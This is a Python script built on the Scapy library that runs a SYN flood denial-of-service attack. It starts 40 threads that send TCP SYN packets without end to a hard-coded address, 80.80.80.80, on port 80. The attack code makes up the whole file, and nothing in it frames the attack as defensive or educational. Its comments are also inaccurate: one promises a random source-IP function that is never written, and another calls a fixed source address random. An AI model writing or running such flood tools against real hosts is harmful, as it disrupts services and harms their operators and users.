from scapy.all import *
import random
import threading

# Target IP address and port
target_ip = "80.80.80.80"
target_port = 80  # HTTP port

# Function to generate a random source IP address


# Function to create and send a TCP SYN packet
def send_syn_packet(target_ip, target_port):
    # Generate a random source IP address and source port
    source_ip = "172.16.0.1"
    source_port = random.randint(1024, 65535)
    
    # Create the IP and TCP headers
    ip = IP(src=source_ip, dst=target_ip)
    tcp = TCP(sport=source_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
    
    # Create the packet
    packet = ip/tcp
    
    # Send the packet
    send(packet, verbose=0)

# Function to run the attack using multiple threads
def dos_attack(target_ip, target_port, num_threads):
    print(f"Starting SYN flood attack on {target_ip}:{target_port} with {num_threads} threads")
    
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets_continuously, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Function to send packets continuously
def send_packets_continuously(target_ip, target_port):
    while True:
        send_syn_packet(target_ip, target_port)

# Execute the attack
if __name__ == "__main__":
    num_threads = 40  # Number of concurrent threads
    dos_attack(target_ip, target_port, num_threads)
